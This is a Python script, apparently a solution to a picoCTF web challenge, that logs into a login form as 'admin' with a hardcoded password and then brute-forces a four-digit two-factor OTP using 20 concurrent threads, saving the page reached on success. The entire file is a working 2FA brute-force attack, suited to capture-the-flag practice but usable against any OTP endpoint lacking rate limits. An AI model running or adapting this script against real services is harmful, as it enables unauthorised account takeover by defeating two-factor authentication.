import requests
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
BASE_URL = "http://foggy-cliff.picoctf.net:57966/"
LOGIN_URL = f"{BASE_URL}/login"
OTP_URL = f"{BASE_URL}/two_fa"

USERNAME = "admin"
PASSWORD = "apple@123" 

def save_page(content, filename="final_page.html"):
    """Saves the HTML content to a local file."""
    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] Final page saved to {filename}")

def attempt_otp(session, otp):
    data = {'otp': str(otp)}
    # We follow redirects so we end up on the home page (index.html)
    response = session.post(OTP_URL, data=data, allow_redirects=True)
    
    if "Invalid OTP" not in response.text and response.status_code == 200:
        return response.text # Return the HTML content of the success page
    return None

def main():
    with requests.Session() as s:
        print(f"[*] Triggering 2FA...")
        login_payload = {'username': USERNAME, 'password': PASSWORD}
        res = s.post(LOGIN_URL, data=login_payload)
        
        if "two_fa" not in res.url:
            print("[!] Failed to reach 2FA page.")
            return

        print("[+] Starting brute force...")
        otp_range = range(1000, 10000)
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Using executor.submit to handle the return value more easily
            futures = [executor.submit(attempt_otp, s, otp) for otp in otp_range]
            
            for future in futures:
                html_content = future.result()
                if html_content:
                    print(f"\n[SUCCESS] OTP Found!")
                    # Save the HTML content we received
                    save_page(html_content)
                    
                    # Kill remaining threads immediately
                    executor.shutdown(wait=False, cancel_futures=True)
                    return

    print("[-] OTP not found or expired.")

if __name__ == "__main__":
    main()